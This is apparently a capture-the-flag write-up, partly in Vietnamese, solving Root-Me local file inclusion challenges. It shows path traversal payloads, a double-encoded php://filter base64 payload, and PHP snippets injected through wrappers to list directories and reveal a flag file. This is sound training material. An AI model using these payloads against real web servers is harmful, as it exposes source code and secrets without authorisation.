### Local File Inclusion
![image](https://user-images.githubusercontent.com/77602549/164174516-0f929bb8-5a10-4fdc-8b86-d54a5687dc73.png)


![image](https://user-images.githubusercontent.com/77602549/164175580-fb16a8e5-ccde-49c6-9efc-9dddf4473bd8.png)

Vậy thư mục admin nằm ngay trong thư mục root.
Ta phải lấy được source code của file index.php

Chúng ta thử dần các payload sau:
  
  + ?files=sysadm&f=/admin/index.php cái này khỏi thử, không có chuyện admin nằm trong đây đâu
  + ?files=sysadm&f=../index.php cái này khỏi thử, nếu admin nằm ngoài đây thì sysadm sẽ thành web-serveur/ch16/admin/sysadm/ rồi, nhưng cũng đáng thử, để biết chall có chặn .. không
  + ?files=sysadm&f=../admin/index.php lỗi file_get_contents(): Filename cannot be empty
  + ?files=sysadm&f=../../admin/index.php di chuyển ra thêm một thư mục nữa -BOOM- ta được source code của file index

![image](https://user-images.githubusercontent.com/77602549/164176305-bc555b84-c24b-4c7d-8c1d-e216cb9ed005.png)





## Local File Inclusion - Double encoding

![image](https://user-images.githubusercontent.com/77602549/164176760-d250d227-f597-4e7c-912a-d9c945de213f.png)


We will use php://filter with base64 encoding

php://filter/convert.base64-encode/resource=cv

after double encoding

php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv




http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf


![image](https://user-images.githubusercontent.com/77602549/164178518-8fb1d70b-6565-4528-8787-7cbd74f7fb66.png)



## Local File Inclusion - Wrappers

![image](https://user-images.githubusercontent.com/77602549/164179748-a96d3d97-6d31-40f9-af6c-74999959a7ec.png)


![image](https://user-images.githubusercontent.com/77602549/164187956-623d7d22-ac08-4ac2-900a-33fab04896fe.png)



<?php $data = file_get_contents(“index.php”); echo $data; ?>


https://vietjack.com/php/ham_scandir_trong_php.jsp



![image](https://user-images.githubusercontent.com/77602549/164188168-fa5d727f-740a-4cab-81c6-33df0d0a3d09.png)



name too long
![image](https://user-images.githubusercontent.com/77602549/164188972-82a3d7f6-414d-42d3-b66a-591f08f132bc.png)

```
<?php 
   $path = getcwd();
   $items = scandir($path);
   
   echo "<p>Content of $path</p>";
   echo '<ul>';
   foreach ($items as $item) {
       echo '<li>' . $item . '</li>';
   }
   echo '</ul>';  
?>

```

![image](https://user-images.githubusercontent.com/77602549/164195162-1aafd712-1969-40f5-9b04-0de766c9ccaf.png)



![image](https://user-images.githubusercontent.com/77602549/164193342-b6c70f3b-fbed-44e0-9f25-295b4e399444.png)


```
<?php
   show_source('flag-mipkBswUppqwXlq9ZydO.php'); 
?>
```







